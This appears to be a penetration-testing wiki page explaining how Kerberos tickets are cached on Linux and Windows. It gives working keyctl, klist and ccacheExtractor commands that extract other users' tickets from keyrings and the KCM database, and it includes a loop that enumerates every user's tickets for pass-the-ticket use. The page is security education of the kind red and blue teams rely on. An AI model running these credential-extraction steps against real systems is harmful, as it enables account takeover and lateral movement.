# 🛠️ Cached Kerberos tickets

## Theory

Kerberos tickets can be cached on systems to allow for faster authentication without requiring users to re-enter credentials. Understanding how these tickets are stored is crucial for both defensive and offensive operations.

### Storage Methods

:::tabs

== UNIX-like

On Linux and other UNIX-like systems, tickets can be stored in 3 different ways:

| Storage     | Description                                                                                                                               |
|-------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| **FILE**    | Stores tickets in files, typically under `/tmp` directory, in the format `krb5cc_%{uid}`                                                   |
| **KEYRING** | Stores tickets in a dedicated kernel keyring space, only accessible to the ticket owner                                                     | 
| **KCM**     | Stores tickets in an LDAP-like database, typically at `/var/lib/sss/secrets/secrets.ldb` (default when using SSSD)                        |

The storage method is configured via the `default_ccache_name` parameter in `/etc/krb5.conf`, which is readable by all users.

> [!NOTE]
> This configuration can be overridden by files in `/etc/krb5.conf.d/`. When using SSSD, the value is typically set in `/etc/krb5.conf.d/kcm_default_ccache`

== Windows 🛠️

On Windows systems, Kerberos tickets are stored in memory by the Local Security Authority Subsystem Service (LSASS) process.

## Practice

### From UNIX-like systems

:::tabs

== FILE Storage

Tickets are stored as files in the configured directory (default: `/tmp`). These files can be directly used for [Pass-the-Ticket](../../kerberos/ptt.md) attacks.

== KEYRING Storage

> [!NOTE]
> While root cannot directly read other users' keyring content, they can still access tickets by using `su - $user`

The `keyctl` utility (commonly pre-installed) can be used to read keyring content:

```bash
# Get persistent keyring address
keyctl get_persistent @u

# Show keyring content
keyctl show 30711432
```

It will display the content of the keyring in a readable format.

```
Keyring
  30711432 ---lswrv      0 65534  keyring: _persistent.0
 127492740 --alswrv      0     0   \_ keyring: _krb
 556713767 --alswrv      0     0       \_ user: krb_ccache:primary
1002684101 --alswrv      0     0       \_ keyring: 0
 110355059 --alswrv      0     0           \_ user: __krb5_princ__
 575224320 --als-rv      0     0           \_ big_key: krb5_ccache_conf_data/pa_type/krbtgt\/LAB.LOCAL\@LAB.LOCAL@X-CACHECONF:
 161110247 --als-rv      0     0           \_ big_key: krbtgt/LAB.LOCAL@LAB.LOCAL
 760223933 --alswrv      0     0           \_ user: __krb5_time_offsets__
```

To reconstruct a Kerberos ticket, you need:
1. The `__krb5_princ__` value (in the example above, it's `110355059`)
2. The service key value (the `big_key` value. In the example above, it's `161110247`)

```bash
# Get principal value
keyctl print $PRINCIPALS_ADDRESS

# Get service key
keyctl print $KEY_ADDRESS

The result will be an hexadecimal string, that can be appended to the ticket header to reconstruct the full ticket.

# Reconstruct ticket
HEADER='0504000c00010008ffffffff00000000'
PRINCIPALS=$(keyctl print $PRINCIPALS_ADDRESS | awk -F : '{print $3}')
KEY=$(keyctl print $KEY_ADDRESS | awk -F : '{print $3}')
ticket=$HEADER$PRINCIPALS$KEY

# Save to file
echo "$ticket" | xxd -r -p > ticket.ccache
```

> [!TIP]
> [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can automate this process:
> ```bash
> python3 ccacheExtractor.py keyring --principals $PRINCIPALS --key $KEY
> ```

A domain joined machine can cache lots of tickets from different users. It would be tedious to list them all manually.
To list all available tickets, the `/proc/key-users` file can be used. It's readable by all users and contains the list of all users with persistent keyrings.

```bash
# List all tickets
for uid in $(awk '{print$1}' /proc/key-users | tr -d :); do
    res=$(KRB5CCNAME=KEYRING:persistent:$uid klist 2>&1)
    if [ $? -eq 0 ]; then
        echo -e "\n=== UID $uid ==="
        echo "$res"
    fi
done

# Use a specific ticket
KRB5CCNAME=KEYRING:persistent:$UID
```

> [!SUCCESS]
> [keyringCCacheDumper](https://github.com/Hakumarachi/keyringCCacheDumper) can automatically extract all tickets.

== KCM Storage

KCM stores tickets in an LDB database file, typically only readable by root. [CCacheExtractor](https://github.com/Hakumarachi/ccacheExtractor) can be used to extract tickets:

```bash
# Extract all tickets from LDB database
python3 ccacheExtractor.py kcm ./secrets.ldb
```

Extracted tickets can then be used with [Pass-the-cache](../../kerberos/ptc.md) or [Pass-the-tickets](../../kerberos/ptt.md) depending on the ticket type.
